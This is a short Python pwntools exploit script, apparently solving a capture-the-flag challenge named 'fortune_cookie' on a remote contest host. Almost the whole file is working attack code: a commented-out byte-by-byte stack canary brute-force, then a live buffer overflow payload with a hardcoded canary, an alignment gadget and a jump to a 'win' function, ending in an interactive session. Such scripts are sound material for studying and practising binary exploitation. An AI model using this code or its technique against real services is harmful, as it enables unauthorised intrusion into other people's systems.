#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

HOST, PORT = 'offsec.m0lecon.it', 13504
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP = 88

elf = ELF('./fortune_cookie', checksec=False)

known = b"\x00"

# for i in range(7):
#     found = False

#     for bval in range(256):
#         guess = known + bytes([bval])
#         payload = b"A" * OFFSET_TO_CANARY + guess

#         io = remote(HOST, PORT, level='error')
#         io.recvuntil(b"wish\n")
#         io.send(payload)

#         try:
#             data = io.recv(timeout=0.2)
#         except EOFError:
#             data = b""

#         io.close()

#         if b"OK" in data:
#             known = guess
#             print(f"[+] byte {i+1}: {bval:02x}")
#             found = True
#             break

#     if not found:
#         print(f"[-] failed to recover byte {i+1}")
#         exit()

# canary = u64(known)
# print(f"[+] Canary: {canary:#x}")

io = remote(HOST, PORT, level='error')
io.recvuntil(b"wish\n")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(0x81c8c213f4078f00),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(0x000000000040101a),
    p64(elf.sym.win),
)

io.send(payload)
io.interactive()